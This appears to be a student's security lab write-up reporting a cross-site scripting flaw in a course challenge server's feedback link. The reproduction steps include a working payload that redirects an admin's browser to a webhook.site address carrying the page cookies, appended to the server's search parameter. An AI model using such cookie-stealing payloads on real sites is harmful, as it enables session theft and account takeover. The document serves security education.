# ist193587

## Vulnerabilty

Cross-site scripting.

## Where

On the link of the bug/feature part.

## Impact

Allows the user to execute script commands on the admin's browser in this case to get the cookies

## Steps to Reproduce

1. First I discovered where it could be executed, since the feedback portion says that what we say is gonna be shared with them i believed that there was a big chance that what was sent is gonna be read by a admin, with this in mind i used Webhook, to have a site i could control, and then just send a script to admin where he would send the resources that are being asked to the url. The payload used is `<script>window.location.replace("https://webhook.site/<random_identifier_you_were_given>?cookie="+document.cookie)</script>` this need to be url encoded since the admin will not read this script has it is. After url encoding it we just insert this in front of `http://mustard.stt.rnl.tecnico.ulisboa.pt:22251/?search=` and we should get the cookie.
